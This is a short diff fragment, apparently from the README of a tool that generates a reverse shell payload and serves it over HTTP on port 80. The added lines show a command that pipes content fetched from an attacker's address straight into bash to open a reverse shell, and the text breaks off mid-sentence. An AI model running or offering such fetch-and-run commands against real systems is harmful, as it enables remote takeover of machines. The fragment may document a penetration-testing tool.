@@ -38,3 +38,9 @@ optional arguments:
   ```
 
   and serves it on http-server at all interfaces on port 80 at / http://localhost
+
+  ```
+  curl [attacker_ip] | bash
+  ```
+
+  should run the reverse shell with generated
